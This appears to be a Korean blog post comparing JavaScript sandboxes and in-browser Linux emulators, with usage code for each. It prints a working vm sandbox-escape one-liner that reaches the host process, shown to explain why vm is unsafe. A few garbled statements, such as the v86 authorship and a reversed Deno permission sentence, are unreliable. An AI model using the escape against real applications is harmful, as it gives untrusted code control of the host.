---
title: Linux 커널 시뮬레이션을 위한 JavaScript 솔루션 비교
description: JavaScript와 TypeScript로 Linux 환경을 다시 만드는 작업에 대한 심층 분석.
date: 2026-05-28
tags:
  - javascript
  - linux
  - analysis
authors:
  - fox3000foxy
author_pubkey: "MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEoFS9I15CAZojXYc6NMqggEYGct9o9b3JnWdXWOtlzgs2lclmqw8adtWgXUeeBMRHvm5LoajQ+OcImaAyA8jwYA=="
author_sig: "zaPgDL3LY9erZpt2kh/5cWeZH5cYdCdV1/Ub1VSF1SDd2xDDJHDnWMKgL2pFokkDu0noiMJUegL4pR8R4SvF6Q=="
---

# 모든 JavaScript 샌드박스와 에뮬레이터, Linux 시뮬레이터, 허니팟 비교

좋아요, 이 토끼굴에 너무 깊이 들어간 지 꽤 됐어요. 모든 것이 시작된 것은 [typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container) 작업을 도우면서였어요. Fortune 프로젝트인데 (잠시 뒤에 다시 나와요). "잠깐, 그거 `v86`이랑 뭐가 달라요?" 또는 "왜 `vm2`를 쓰지 않아요?"라는 질문을 계속 받았어요. 먼저 생태계 전체를 지도화하지 않고는 명확히 답할 수 없음을 깨달았어요. 그래서 여기까지 왔네요, 뭐.

네 가지 서로 다른 계열이 있어요. JS 샌드박스와 Linux 에뮬레이터, Linux 시뮬레이터, 허니팟. 거의 겹치지 않아요. 같은 문장에서 계속 언급되지만요. 플러그인 시스템을 만드는 사람은 `isolated-vm`을 쓰고, CLI 도구 데모를 만드는 사람은 `v86`을 쓰고, SSH 위협 인텔을 하는 사람은 Cowrie를 써요. "코드를 상자에 넣어 돌리기"라는 막연한 우산 아래 완전히 다른 문제를 풀어요.

이 글을 쓰려고 소스 코드와 CVE 보고서, 아키텍처 문서, npm 페이지를 많이 읽었어요. 길어질 거예요. 커피 한 잔 하세요. 진심으로요. 두 잔.

> 작은 면책: 이 연구를 시작하게 한 것이 `typescript-virtual-container`라서 이 글에서 비중 있게 다뤄요. 나머지에 공평하려고 애썼지만 이 맥락을 염두에 두세요.

---

## 0부: 먼저, 진짜로 푸는 문제는 무엇인가요?

들어가기 전에 각 계열이 무슨 소용인지 정확히 하는 것이 좋아요. 용어가 금방 지저분해지고 사람들이 계속 섞거든요 (저 포함. 제대로 앉아서 지도화하기 전까지는요).

**JS 샌드박스**는 호스트 Node.js 프로세스에서 신뢰할 수 없는 JavaScript 코드를 격리해요. 위협 모델은 `process.exit()`을 부르고 파일을 읽고 자식 프로세스를 실행할 수 있는 신뢰할 수 없는 JS 코드예요. 해법은 V8 실행 경계예요. 이 도구들은 Linux 셸이나 권한이 있는 파일시스템, SSH 개념이 없어요.

**Linux 에뮬레이터**는 JavaScript나 WebAssembly로 구현된 CPU 에뮬레이션(x86, RISC-V, OR1K) 안에서 수정되지 않은 진짜 Linux 커널을 돌려요. 진짜 OS를 부팅해요. 진짜 시스템 콜이 있어요. x86용으로 컴파일된 프로그램과 이진 호환이 있어요. 자원 비용이 막대해요.

**Linux 시뮬레이터**는 진짜 커널을 돌리지 않고 *Linux 시스템처럼 동작*을 흉내 내요. 가상 파일시스템과 셸 인터프리터, Unix 의미를 흉내 낼 만큼 구현해서 프로그램과 사람을 속여요. 커널도 Wasm도 CPU 에뮬레이션도 없어요. 자원이 훨씬 적어요.

**허니팟**은 공격자를 끌어들여 무엇을 하는지 기록하려고 설계돼요. 주로 실행 환경이 아니에요. 관측 도구예요. 진짜 Linux 동작 충실도는 공격자가 함정을 감지하지 못할 정도만큼만 중요해요.

이 틀이 있으면 이 글의 각 프로젝트 자리가 보여요.

```
JS 샌드박스:       vm, vm2, isolated-vm, quickjs-emscripten, Deno Workers, ShadowRealm
Linux 에뮬레이터:  v86, JSLinux/TinyEMU, jor1k, CheerpX, WebContainers, container2wasm
Linux 시뮬레이터: typescript-virtual-container (이 공간에서 유일)
허니팟:           Cowrie, Kippo, Lyrebird, endlessh, sshesame, node-simple-ssh-honeypot
터미널 스택:      xterm.js + node-pty (격리자가 아니지만 관련)
```

---

## 1부: JavaScript 샌드박스

### 1.1 `vm`: Node.js 네이티브 모듈 (생각하는 것과 달라요)

Node에서 "신뢰할 수 없는 JS 실행"에 가장 오래된 답은 네이티브 `vm` 모듈이에요. v0.1부터 있어서 많은 사람이 먼저 쓰고 데여요.

```js
const vm = require("vm");
const sandbox = { answer: 0 };
vm.createContext(sandbox);
vm.runInContext("answer = 6 * 7", sandbox);
console.log(sandbox.answer); // 42
```

`vm`이 실제로 하는 것: 새 V8 컨텍스트(네이티브 생성자 새 묶음. `Object`, `Array`, `Function` 등)를 만들고, `sandbox`에 넣은 것에 공유 참조를 걸고 코드를 실행해요. V8 엔진은 바뀌지 않아요. 프로세스는 바뀌지 않아요. 메모리는 공유돼요.

`vm`이 보안을 주지 않는 이유: JavaScript 프로토타입 체인은 모든 것을 `Object.prototype`에 잇는 DAG예요. 호스트 세상 물건을 샌드박스에 넣으면 게스트가 프로토타입 체인을 타고 올라가 호스트 생성자에 닿을 수 있어요. `Function`에서 `Function("return process")()`를 부르고 진짜 `process`를 가져올 수 있어요. 게임 끝. 바로요.

```js
// vm에서 완벽히 동작해요. 진짜 process를 가져와요
vm.runInNewContext(`({}).__proto__.constructor("return process")()`);
```

Node.js 문서 자체가 말해요. "vm 모듈은 보안 구조가 아니에요. 신뢰할 수 없는 코드를 실행하는 데 쓰지 마세요." 이 경고는 영원히 있었어요. 사람들이 계속 무시해요. 프로덕션 앱이 `vm`을 샌드박스로 쓰는 것을 봤어요. 제발 그러지 마세요.

**판결**: 범위 장치이지 샌드박스가 아니에요. 변수 격리가 필요할 때 쓰세요 (코드를 통제하는 템플릿 엔진, `eval` 같은 기능). 신뢰할 수 없는 입력에는 절대 안 돼요.

**메모리**: 호스트 프로세스와 같은 V8 힙이라 부담 무시해도 돼요.
**보안**: 마음먹은 공격자에 대항 없음.

---

### 1.2 `vm2`: 커뮤니티 시도와 아주 긴 죽음

`vm2`는 `vm` 탈출 문제에 대한 커뮤니티 답이었어요. 핵심 생각: 샌드박스 경계를 넘는 모든 객체를 속성 접근을 가로채고 프로토타입 상승을 막고 위험 참조를 걸러내는 `Proxy`로 감싸기. 이론적으로 영리한 생각! 실제로 결과는 그다지 설득력이 없었어요. 보게 될 거예요.

```js
const { VM } = require("vm2");
const vm = new VM({ timeout: 1000, sandbox: {} });
vm.run("process.exit(1)"); // VMError가 나고 process에 닿지 않아요
```

몇 년 동안은 꽤 잘 동작했어요. 하지만 JavaScript `Proxy` 공격 표면은 막대해요. 새로운 JS 언어 기능마다 제너레이터와 비동기 이터레이터, `Symbol.toPrimitive`, `Error.prepareStackTrace`, `Promise` 내부 슬롯이 잠재 우회 벡터예요.

CVE 연표는... 뭐예요. 이것 좀 보세요.

| 날짜 | CVE | 구조 |
|------|-----|-----------|
| 2022년 10월 | CVE-2022-36067 | `Error.prepareStackTrace` 경유 호스트 맥락 탈출 |
| 2023년 4월 | CVE-2023-29017 | 처리되지 않은 비동기 오류로 호스트 객체 유출 |
| 2023년 4월 | CVE-2023-29199 | `handleException()` 경유 예외 살균 우회 |
| 2023년 4월 | CVE-2023-30547 | `Proxy.getPrototypeOf`에서 `Function`으로 RCE |
| 2023년 5월 | CVE-2023-32314 | `Error.name` `Proxy`에서 `Function`으로 RCE |
| 2023년 7월 | CVE-2023-37466 | 비동기 함수 + 스택 오버플로우 + `Proxy.getPrototypeOf` |
| 2023년 7월 | CVE-2023-37903 | 워커 스레드 + eval 탈출 |

같은 달(2023년 4월)에 크리티컬 CVE 셋. 셋이요. 한 달에요. CVE-2023-37903 뒤에 관리자가 라이브러리를 공식 폐기했어요. *"라이브러리에 크리티컬 보안 문제가 있고 프로덕션에 쓰면 안 돼요."*

관리자가 2025년 10월 버전 3.10.0으로 부활시켜서 당시에 알려진 것을 모두 고쳤다고 주장했어요. 2026년 1월에 새 탈출 크리티컬(CVE-2026-22709, CVSS 9.8)이 공개됐고, 2026년 5월에 11개가 더 나왔어요. 열한 개. 패턴이 바뀌지 않았고 솔직히 절대 바뀌지 않을 것 같아요.

기본 문제가 아키텍처예요. 생태계 전체가 배우는 데 시간이 걸린 교훈이고요. 격리하는 것과 같은 언어로 같은 엔진에서 같은 프로세스로 안전한 샌드박스를 만들 수 없어요. 탈출 표면이 V8 구현 전체예요. V8은 계속 바뀌는 수백만 줄 C++예요. 새로운 JS 기능마다 잠재 새 공격 길이 열려요.

**판결**: 보안에 민감한 용도에 쓰지 마세요. 최신 버전에서도 몇 달마다 새 우회가 나와요. 관리자 스스로 공개적으로 인정했어요.

---

### 1.3 `isolated-vm`: 진짜로 동작하는 것

`isolated-vm`은 올바른 접근을 써요. V8 네이티브 격리 원시, Isolate. 각 V8 Isolate는 자기 힙과 자기 가비지 컬렉터, 자기 네이티브 묶음을 가지고 다른 Isolate와 공유 참조 제로예요.

Chrome이 탭 사이 쓰는 것과 같은 경계예요. 진짜 보안 장벽이지 Proxy로 지은 언어 꼼수가 아니에요.

```js
import ivm from "isolated-vm";

// 각 isolate는 자기 V8 힙
const isolate = new ivm.Isolate({ memoryLimit: 64 }); // MB 한도
const context = await isolate.createContext();
const jail = context.global;

// 경계 너머 자료를 보내려면 명시 직렬화가 필요해요
await jail.set("sensitiveData", "not this");
await jail.set("log", new ivm.Reference(console.log));

const script = await isolate.compileScript(`
  // 호스트 프로세스와 힙, 모듈에 닿을 수 없어요
  log.applySync(undefined, ["hello from the isolate"]);
`);
await script.run(context);

// 시간 초과나 메모리 한도에 강제로 끝낼 수 있어요
isolate.dispose(); // 힙 전체 해제
```

`Reference`와 `ExternalCopy` 종류가 명시 소통 다리예요. `Reference`가 isolate에 호스트 함수 호출 핸들을 줘요. isolate는 호출할 수 있지만 클로저나 프로토타입을 들여볼 수 없어요. `ExternalCopy`가 값을 (구조 복제) 힙 경계 너머 직렬화해요. 이 명시 다리 모델은 편하지 않지만 격리를 진짜로 만드는 것이에요.

엄격한 자원 한도를 정할 수 있어요. 메모리 (한도를 넘으면 isolate 종료), 벽시계 시간 초과, CPU 시간 초과. 종료가 진짜예요. V8 Isolate 전체를 죽이지 `while(true)`로 우회할 수 있는 JS 시간 초과가 아니에요.

**한도**: JS 전용이에요. 안에서 bash를 실행할 수 없어요. 파일과 권한, 네트워크, 프로세스 개념이 없어요. 사용자 제출 JS(플러그인, 공식, 스크립트 훅)에 정확히 올바른 도구이고, 나머지에는 잘못된 도구예요. `typescript-virtual-container` 저자가 처음에 고려했다가 "셸 명령 실행"과 "JavaScript 격리"가 근본적으로 다른 문제임을 깨달았다고 언급했어요.

**메모리**: 빈 isolate당 ~3-10MB, 힙 사용에 따라 증가해요.
**보안**: 탄탄. V8 Isolate 경계가 진짜 격리 원시예요.
**npm**: [isolated-vm](https://www.npmjs.com/package/isolated-vm)
**GitHub**: [laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)

---

### 1.4 `quickjs-emscripten`: Wasm으로 컴파일된 별도 JS 엔진

다른 접근이에요. V8 안에 격리하는 대신 Wasm으로 컴파일된 완전히 분리된 JavaScript 엔진을 돌리기. 호스트는 V8과 Node에서 돌아요. 게스트는 Wasm 속 QuickJS에서 돌아요. Wasm 샌드박스가 격리 경계를 줘요.

QuickJS는 여전히 Fabrice Bellard 작품이에요 (QEMU와 FFmpeg, JSLinux, TinyEMU 뒤의 같은 사람. 이 사람 진짜가 아니에요. 진심으로 어떻게 한 사람이 이 모든 것을 해요?). C로 쓴 ES2023 표준 준수 작은 JS 엔진이고, Wasm으로 컴파일하면 약 500KB예요.

```js
import { getQuickJS } from "quickjs-emscripten";

const QuickJS = await getQuickJS();
const vm = QuickJS.newContext();

const result = vm.evalCode(`
  // QuickJS에서 실행, V8과 완전히 분리
  (function() { return 6 * 7; })()
`);

if (result.error) {
  console.log("Error:", vm.dump(result.error));
  result.error.dispose();
} else {
  console.log("Result:", vm.dump(result.value)); // 42
  result.value.dispose();
}

vm.dispose();
```

QuickJS는 C로 쓴 ES2023 표준 준수 작은 JavaScript 엔진이에요. Wasm으로 컴파일하면 동기 변형 약 500KB, 비동기 변형 (Asyncify) ~1MB예요. 메모리 관리가 수동이에요. VM에서 꺼내는 값마다 명시 해제해야 해요. 조금 귀찮지만 경계 너머 GC 놀라움이 없어요. 재미있는 절충!

`@sebastianwessel/quickjs` 래퍼가 위에 더 편한 API를 더하고, 선택 가상 파일시스템과 fetch 지원, Node.js 모듈 스텁이 있어요.

```ts
import variant from "@jitl/quickjs-ng-wasmfile-release-sync";
import { loadQuickJs } from "@sebastianwessel/quickjs";

const { runSandboxed } = await loadQuickJs(variant);

const result = await runSandboxed(
  async ({ evalCode }) => evalCode(`
    import { join } from 'path';
    export default join('src', 'dist');
  `),
  { allowFs: false, allowFetch: false }
);
```

보안 모델이 `isolated-vm`과 달라요. Wasm 선형 메모리 모델 때문에 게스트가 V8 힙 객체에 직접 닿을 수 없어요. 공격 표면이 호스트와 Wasm 사이 인터페이스(import와 export)지 전체 JS 언어가 아니에요. Proxy 기반 샌드박스보다 강건하다고 보통 여겨져요.

뒷면: QuickJS 최적화가 V8 수준이 아니에요. CPU 바운드 JS 부하에는 V8보다 5~20배 느려요. 작은 코드 조각과 신뢰할 수 없는 평가에는 보통 중요하지 않아요.

**메모리**: Wasm 모듈 ~500KB + 인스턴스별 힙.
**보안**: Wasm 경계, Proxy 접근보다 탄탄하다고 여겨져요.
**npm**: [quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten), [@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs)
**GitHub**: [justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)

---

### 1.5 Deno: 권한을 먼저 두는 런타임

Deno는 완전히 다른 철학을 써요. Node 안에서 샌드박스를 만드는 대신 기본 안전한 새 런타임을 만들기. 저는 이 접근이 정말 좋아요. Node.js가 처음부터 그랬어야 할 모습이에요, 솔직히. Ryan Dahl (원래 Node.js 만든 사람)이 Node.js 설계 결정 일부를 후회해서 말 그대로 Deno를 만들었어요. 생각하면 꽤 미쳤어요.

민감한 능력(파일 읽기, 파일 쓰기, 네트워크, 환경, 하위 프로세스)마다 명시 `--allow-*` 플래그가 필요해요.

```bash
# 이것은 /data 안에서만 읽을 수 있고 다른 것은 없어요
deno run --allow-read=/data script.ts

# 이것은 단일 도메인에만 닿을 수 있어요
deno run --allow-net=api.example.com script.ts

# 플래그 없음 = 권한 없음
deno run untrusted.ts # 읽기도 쓰기도 네트워크도 실행도 없어요
```

권한 모델이 Rust와 OS 수준에서 구현돼요. JS 꼼수가 아니에요. Deno 코드가 `Deno.readFile()`을 부르면 파일시스템에 닿기 전에 권한 표를 확인하는 Rust 연산을 거쳐요. 권한이 없으면 시스템 호출이 절대 일어나니 JS에서 우회할 수 없어요.

진짜 신뢰할 수 없는 코드를 실행하려면 Deno 워커(웹 워커)가 같은 프로세스 속 두 번째 격리를 줘요. 각자 자기 권한 묶음이 있어요. 권한 제로 워커를 실행하고 `postMessage`로 소통할 수 있어요.

Deno 2 (2024년 10월 출시)가 완전한 npm 호환과 Node.js 호환 심을 더해서 서버 쪽 쓰임 채택이 크게 좋아졌어요.

**절충**: Deno 보안 모델은 부분 신뢰할 코드에 훌륭해요. 적대적일 수 있는 완전히 신뢰할 수 없는 코드에는 권한 모델이 소용없어요. Isolate 경계(`isolated-vm`)나 다른 엔진(`quickjs-emscripten`)이 필요해요. Deno가 여전히 V8을 쓰고 정교한 공격자가 V8 수준 버그를 찾을 수 있어서예요.

---

### 1.6 TC39 ShadowRealm: 표준화된 답 (언젠가)

JavaScript 표준 기구(TC39)에 ShadowRealm이라는 제안이 있어요. `vm`과 `vm2`가 하려던 것을 올바른 보안 모델로 표준화하려는 시도예요. ShadowRealm이 자기 내장 객체와 외부 세상 접근 없이, 조심스레 통제된 가져오기와 내보내기 인터페이스가 있는 격리 JS 실행 맥락을 만들어요.

```js
const realm = new ShadowRealm();
const result = realm.evaluate(`
  // 분리된 내장 객체, 외부 세상 접근 없어요
  typeof globalThis.fetch // "undefined"
  6 * 7 // 42
`);
```

ShadowRealm은 브라우저에 있어요 (Chrome 90+, Firefox 105+). 2026년 안정 Node.js에는 아직 없어요. TC39 Compartments 제안이 모듈 수준 격리를 위해 위에 쌓여요. 장기 표준 답이지만 Node 서버 프로덕션 준비는 아직 아니에요. 멀리서 오는 것이 보이는 공사 중 하나인데... 아직 거기 없어요. 전형적인 TC39.

---

### 샌드박스 계열 요약

| | `vm` | `vm2` | `isolated-vm` | `quickjs-emscripten` | Deno Workers |
|---|---|---|---|---|---|
| **격리 경계** | 없음 (범위) | Proxy (깨짐) | V8 Isolate | Wasm | V8 Isolate + Rust 권한 |
| **메모리 한도** | ❌ | ❌ | ✅ 엄격 한도 | ✅ Wasm 힙 | 부분 |
| **CPU 시간 초과** | ❌ | ✅ (우회 가능) | ✅ 엄격 | ✅ | ✅ |
| **보안** | 없음 | 깨짐 | 탄탄 | 탄탄 | 탄탄 |
| **JS 속도** | 네이티브 V8 | 네이티브 V8 | 네이티브 V8 | ~10배 느림 | 네이티브 V8 |
| **브라우저** | ❌ | ❌ | ❌ | ✅ | ❌ |
| **Node 호환** | 네이티브 | ✅ | ✅ | 부분 심 | 부분 |
| **상태** | 안정 | 위험 (새 CVE) | ✅ 활성 | ✅ 활성 | ✅ 활성 |
| **RAM 부담** | ~1 MB | ~5-20 MB | ~3-10 MB | ~5-15 MB | ~10-30 MB |

판결: 보안이 중요하면 진짜 선택지는 정확히 둘. `isolated-vm` (네이티브 확장, V8 Isolate, JS 최대 속도)과 `quickjs-emscripten` (Wasm, 브라우저 호환, 계산 집약에 ~10배 느림). 나머지는 "제발 그러지 마세요"(`vm`, `vm2`) 아니면 완전히 다른 문제를 푸는 런타임(Deno)예요. ShadowRealm이 언젠가 판을 바꿀 수 있지만 아직 아니에요.

---

## 2부: JavaScript Linux 에뮬레이터

여기에서 저에게 진짜 흥미로워져요. *진짜* 에뮬레이터예요. JavaScript나 WebAssembly로 CPU 명령어 집합을 구현하고, 진짜 Linux 커널 이미지를 부팅하고, 진짜 사용자 바이너리를 실행해요. 격리는 게스트와 호스트가 아무것도 공유하지 않는 데서 와요. 메모리 공간도 다르고, 명령어 흐름도 달라요.

대가는 막대하지만 얻는 것은 정말 놀라워요. 진짜 Linux가 진짜로 돌아가고, 브라우저나 Node 프로세스 속이예요. 생각하면 꽤 미쳤죠, 그렇죠?

### 2.1 `v86`: JS + Wasm JIT의 x86 PC 에뮬레이터

GitHub의 Fabrice(copy)作 `v86`은 JavaScript에서 가장 능력 있는 오픈 소스 x86 에뮬레이터예요. 2013년쯤 순수 JS 인터프리터로 시작해서 x86 기본 블록을 그때그때 WebAssembly로 번역하는 JIT 시스템으로 발전했고 성능이 크게 좋아졌어요.

에뮬레이션하는 것:

- **CPU**: x86-32 (IA-32), Pentium 1 수준 명령어 집합. 64비트 (x86-64)는 계속 빠져요. 빠진 기능이 아니라 하드웨어 아키텍처 한도예요.
- **FPU**: JavaScript `Float64Array` 경유. x87은 80비트 확장 정밀도. JS double은 64비트. 부동소수점 결과가 진짜 CPU와 살짝 다를 수 있어요.
- **메모리**: 설정 가능, JS 힙 속 `SharedArrayBuffer`나 `ArrayBuffer`에 매핑.
- **하드웨어**: 8254 PIT (타이머), 8259 PIC (인터럽트 컨트롤러), 8042 키보드 컨트롤러 (PS/2), CMOS RTC, SVGA와 Bochs VBE 확장 VGA, IDE 컨트롤러, 플로피 컨트롤러 (8272A), NE2000 네트워크 카드.
- **BIOS**: SeaBIOS (오픈 소스 x86 BIOS) 사용.

JIT은 기본 블록(x86 명령어 점프 없는 연속)을 찾아 WebAssembly 함수로 번역하고, 이 함수를 캐시하고, 같은 블록 다음 실행 때 부르는 방식으로 동작해요. 뜨거운 코드 경로는 네이티브 Wasm 성능을 얻어요. 차가운 경로는 JS 인터프리터로 돌아가요.

```js
import { V86 } from "v86";
import { readFileSync } from "fs";

const emulator = new V86({
  bios:    { buffer: readFileSync("./bios/seabios.bin") },
  vga_bios:{ buffer: readFileSync("./bios/vgabios.bin") },
  hda:     { buffer: readFileSync("./images/alpine.img"), async: false },
  memory_size: 128 * 1024 * 1024, // 128MB
  autostart: true,
});

// 직렬 출력 잡기 (Linux 커널 콘솔)
emulator.add_listener("serial0-output-byte", byte => {
  process.stdout.write(String.fromCharCode(byte));
});

// 게스트에 입력 보내기 (셸에 치기)
emulator.serial0_send("ls /\n");
```

**지원 OS**: Alpine Linux (훌륭), Ubuntu 16.04와 18.04 (i386만), 32비트 Arch Linux, ReactOS, FreeDOS, Windows 9x와 2000 (유보적), MS-DOS.

**부팅 시간**: 깨끗한 이미지에서 Alpine Linux 15~40초. 진짜 커널 초기화에 내재돼요. 건너뛸 수 없어요. 네, 사용자가 브라우저에서 Linux 커널 부팅을 보게 돼요. 거래예요.

**최소 메모리**: 인스턴스당 100~256MB. 바쁜 Linux 인스턴스의 Wasm JIT 코드 캐시 하나만 수십 MB가 될 수 있어요.

**Node.js 쓰임**: 완전 지원. DOM은 불필요해요. 직렬 출력에만 관심 있으면 VGA 출력은 무시할 수 있어요.

**못 하는 것**: 64비트 바이너리 실행, 현대 커널 기능(eBPF, io_uring 등), 메모리 한도에 닿지 않고 동시 인스턴스 몇 개 이상 돌리기.

**npm**: [v86](https://www.npmjs.com/package/v86). 계속 고쳐지고 쓰고 있는 날 당일 최신 게시.
**GitHub**: [copy/v86](https://github.com/copy/v86)
**데모**: [copy.sh/v86](https://copy.sh/v86)

---

### 2.2 JSLinux와 TinyEMU: 두 번의 Bellard 작업

JSLinux는 Fabrice Bellard의 JavaScript Linux 에뮬레이터예요. 최초, 2011년 공개. 이 글에서 Bellard를 계속 언급하는 것은 계속 다시 나타나서예요. QuickJS, TinyEMU, JSLinux, QEMU, FFmpeg. 이 사람 뭔가 달라요. 과장 없이 소프트웨어 역사에서 가장 인상적인 개인 기술 기여 중 하나예요.

원래 JSLinux는 순수 JS x86 인터프리터였어요. 2016년에 Bellard가 TinyEMU(C로 쓴 RISC-V 에뮬레이터)를 쓰고 Emscripten으로 JavaScript로 컴파일했고, 지금 JSLinux 토대가 됐어요. 그래서 지금 JSLinux는 사실 JavaScript를 만드는 C 코드예요. 손으로 쓴 JS가 전혀 아니에요.

Bellard 사이트 기술 노트가 읽을 만해요. 지금 JSLinux는 32비트나 64비트 RISC-V CPU(x86 아님)를 돌리고, VirtIO 콘솔과 VirtIO 네트워크, VirtIO 블록 장치, 호스트와 파일 공유용 9P 파일시스템을 에뮬레이션해요. JS 데모는 Emscripten으로 C에서 컴파일돼요. 손으로 쓴 JS가 아니에요.

TinyEMU 자체가 지원해요.

- RISC-V RV32IMAFDQC와 RV64IMAFDQC (32비트와 64비트, 부동소수점과 곱셈, 압축 명령)
- KVM 경유 x86 (네이티브만, 에뮬레이션 아님. 그래서 JS 버전은 RISC-V만)
- VirtIO 콘솔, 네트워크, 블록, 입력, 9P 파일시스템

TinyEMU에 Emscripten 경유 JavaScript 데모가 있어요. JSLinux 토대이고 `container2wasm`도 써요 (섹션 2.5 참고).

**JSLinux 상태**: npm 패키지 없음, 프로그래밍 API 없음. 브라우저에서 여는 데모예요. 역사 중요성은 커요. 개념을 증명했어요. 라이브러리 실용성은 제로.

**TinyEMU**: npm에 없고 C 소스가 [bellard.org/tinyemu](https://bellard.org/tinyemu/)에 있어요.

---

### 2.3 jor1k: OR1K 에뮬레이터

jor1k는 Sebastian Macke가 JavaScript로 쓴 OpenRISC 1000 (OR1K) 에뮬레이터예요. Bellard가 TinyEMU와 JSLinux에 나중에 넣은 VirtIO 9P 파일시스템 지원을 처음 만든 것이 역사적으로 흥미로워요. 이 프로젝트들 사이 교차 수분이 촘촘해요. 서로 아이디어를 빌려요. 오픈 소스 에뮬레이션 작업에서 가장 멋진 점 중 하나예요, 솔직히.

**상태**: 더 이상 활발히 유지되지 않고 npm 패키지 없어요. 이 시점에 보관. 역사 맥락으로 알면 좋아요. 대화에서 누가 jor1k를 언급하면 이제 무엇을 말하는지 아시죠 :)

---

### 2.4 CheerpX: 브라우저용 상용 x86 에뮬레이터

Leaning Technologies作 CheerpX는 프로덕션급 상용 Linux x86 에뮬레이터예요. 오픈 소스가 아니지만 진짜 Debian과 Ubuntu 사용자 공간을 돌리는 데 v86보다 분명히 능력이 좋아요. 브라우저에 진짜 VSCode가 필요하면 바로 이거예요.

v86과 핵심 차이:

- 더 넓은 ISA 지원 (x86 확장이 더 많고 glibc 호환이 더 나아요)
- 브라우저 IndexedDB 기반 파일시스템 (페이지 새로고침 사이 영속)
- `SharedArrayBuffer` 경유 pthread 지원 (COOP와 COEP 헤더가 필요해요. 네, 그 귀찮은 보안 헤더들)
- 진짜 앱을 돌리려고 설계. VSCode, Python, Node.js, 다른 진짜 애플리케이션. 최소 OS 이미지만이 아니에요
- 전문 지원과 SLA 가능 (깨지면 누구에게 화낼 수 있다는 뜻)

전형 쓰임은 "서버 없이 브라우저에서 진짜 Linux 앱 돌리기"예요. 기업이 브라우저 기반 IDE와 코딩 튜토리얼, 인터랙티브 문서에 써요.

```js
// CheerpX API (단순화)
const cx = await CheerpX.Linux.create({
  mounts: [{ type: "ext2", path: "/", dev: CloudDevice.create(...) }],
});
await cx.run("/bin/bash");
```

**Node.js 이야기**: CheerpX는 먼저 브라우저용으로 설계됐어요. 밑바탕 에뮬레이터가 이론적으로 Node에서 동작할 수 있어요 (Wasm이니까). API와 문서는 완전히 브라우저 쓰임 중심이에요. 서버 쪽 쓰임은 지원되지 않아요.

**메모리**: v86과 비슷. 진짜 Debian 인스턴스에 200MB 이상.
**가격**: 오픈 소스 프로젝트 무료, 프로덕션 SaaS 상용 라이선스.
**문서**: [cheerpx.io/docs/overview](https://cheerpx.io/docs/overview)

---

### 2.5 WebContainers (StackBlitz): Wasm 속 Node.js, Linux 에뮬레이션 아님

WebContainers는 흔히 Linux 에뮬레이터와 같은 취급을 받지만 아키텍처가 달라요. x86을 에뮬레이션하지 않아요. Linux를 부팅하지 않아요. WASI를 써서 WebAssembly로 컴파일된 Node.js를 돌려요. 이 구분이 많이 중요하고, 저는 이것 때문에 너무 오래 헷갈렸어요.

혼동이 마케팅에서 온다고 생각해요. "브라우저에서 Node.js 돌리기"가 에뮬레이션처럼 들리지만, 사실 Linux를 에뮬레이션해서 VM 속 Node.js를 돌리는 것이 아니라 Wasm으로 컴파일된 Node.js 자체예요. 완전히 다른 두 아키텍처.

아키텍처:

1. Node.js를 Wasm으로 컴파일 (특별 맞춤 WASI 런타임)
2. 서비스 워커가 에뮬레이트된 Node.js 서버 네트워크 요청을 가로채 브라우저 탭으로 라우팅
3. 파일시스템이 브라우저 메모리에 살아요 (디스크 입출력 없음)
4. npm은 브라우저 쓰임에 최적화된 맞춤 구현

```js
import { WebContainer } from "@webcontainer/api";

const webcontainer = await WebContainer.boot();

// 파일 쓰기
await webcontainer.mount({
  "index.js": { file: { contents: `console.log("hello")` } },
  "package.json": { file: { contents: `{"name":"demo","type":"module"}` } }
});

// Node.js 명령 실행
const proc = await webcontainer.spawn("node", ["index.js"]);
proc.output.pipeTo(new WritableStream({ write: chunk => console.log(chunk) }));
```

진짜 Node.js(Wasm으로 컴파일)를 실행하니 진짜 npm과 진짜 Node.js API, 진짜 모듈 해석이 있어요. 범용 Linux 사용자 공간은 없어요. `apt`로 시스템 패키지를 설치하거나 임의 컴파일 바이너리를 실행하거나 Node.js 생태계 밖에 큰 일을 할 수 없어요.

**브라우저 전제**: SharedArrayBuffer (COOP와 COEP 헤더 필요), 서비스 워커 지원, 현대 Wasm.

**Node.js 이야기**: 브라우저 전용 쓰임으로 설계. 브라우저 맥락 밖에서는 API가 동작하지 않아요.

**npm**: [@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api)
**문서**: [webcontainers.io](https://webcontainers.io)

---

### 2.6 container2wasm: Wasm으로 컴파일된 Docker 컨테이너

`container2wasm`은 NTT 도구(npm 패키지 아님)예요. Docker 컨테이너 이미지를 가져와서 브라우저 포함 어떤 Wasm 호스트에서든 돌 수 있는 WebAssembly 바이너리로 바꿔요. 처음 봤을 때 정말 동작한다고 믿지 않았어요.

구조:

- x86_64 컨테이너용: Bochs(x86 에뮬레이터, Wasm으로 컴파일) + 컨테이너 루트 파일시스템 포함
- riscv64 컨테이너용: TinyEMU(또 Bellard!) + 컨테이너 루트 파일시스템 포함
- 결과 `.wasm` 파일이 에뮬레이터를 부팅하고 컨테이너 파일시스템을 마운트하고 컨테이너 진입점을 실행해요

```bash
# Ubuntu 22.04 컨테이너를 Wasm으로 바꾸기
c2w ubuntu:22.04 out.wasm

# 실행하기
wasmtime out.wasm uname -a
# Linux 5.15.0 #1 SMP riscv64 GNU/Linux

# 또는 브라우저 쓰임으로 서빙
c2w --to-js ubuntu:22.04 /tmp/htdocs/
```

결과 `.wasm`이 커요. 최소 Ubuntu가 수백 MB. 하지만 완전히 독립적이에요. 누군가에게 `.wasm`을 이메일로 보내면 브라우저에서 Ubuntu를 돌릴 수 있어요. 이 문장이 말이 되면 안 되는데 여기까지 왔어요.

**GitHub**: [container2wasm/container2wasm](https://github.com/container2wasm/container2wasm)

---

### 에뮬레이터 계열 요약

| | `v86` | JSLinux/TinyEMU | jor1k | CheerpX | WebContainers | container2wasm |
|---|---|---|---|---|---|---|
| **아키텍처** | x86-32 JIT→Wasm | RISC-V (Wasm) | OR1K (JS) | x86 (독점) | Node.js→Wasm/WASI | x86/RISC-V (Wasm) |
| **진짜 커널** | ✅ | ✅ | ✅ | ✅ | ❌ (Node.js) | ✅ |
| **64비트** | ❌ | ✅ (RISC-V) | ❌ | ✅ | n/a | ✅ |
